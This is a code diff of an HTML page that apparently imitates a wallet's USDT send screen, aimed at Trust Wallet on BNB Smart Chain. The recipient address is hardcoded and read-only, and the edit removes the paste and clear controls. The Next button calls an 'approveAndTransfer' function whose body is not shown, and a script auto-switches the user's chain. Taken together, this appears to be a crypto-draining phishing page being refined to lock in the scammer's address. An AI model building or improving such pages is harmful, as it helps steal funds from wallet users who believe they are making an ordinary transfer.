@@ -9,16 +9,14 @@
 </head>
 <body>
   <div class="container">
-    <label for="address">Address or Domain Name</label>
+    <label for="address">Recipient Address</label>
     <div class="input-wrapper">
       <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly>
-      <span onclick="clearAddress()">✕</span>
-      <span onclick="pasteAddress()">Paste</span>
     </div>
 
     <label for="amount">Amount</label>
     <div class="amount-wrapper">
-      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()" />
+      <input type="number" id="amount" placeholder="0.00" oninput="updateFiat()" />
       <span>USDT</span>
       <span onclick="fillMax()">Max</span>
     </div>
@@ -28,15 +26,14 @@
     <button onclick="approveAndTransfer()">Next</button>
   </div>
 
+  <!-- Trust Wallet + BNB Chain Auto Setup -->
   <script>
-    // Auto-reload fix if blank (Trust Wallet)
     window.addEventListener("load", () => {
       if (document.body.innerHTML.trim() === "") {
         location.reload();
       }
     });
 
-    // Auto switch to BNB Smart Chain (Chain ID: 0x38)
     async function ensureBNBChain() {
       if (window.ethereum) {
         try {
@@ -45,7 +42,6 @@
             params: [{ chainId: '0x38' }],
           });
         } catch (err) {
-          // If not added, try to add it
           if (err.code === 4902) {
             await window.ethereum.request({
               method: 'wallet_addEthereumChain',
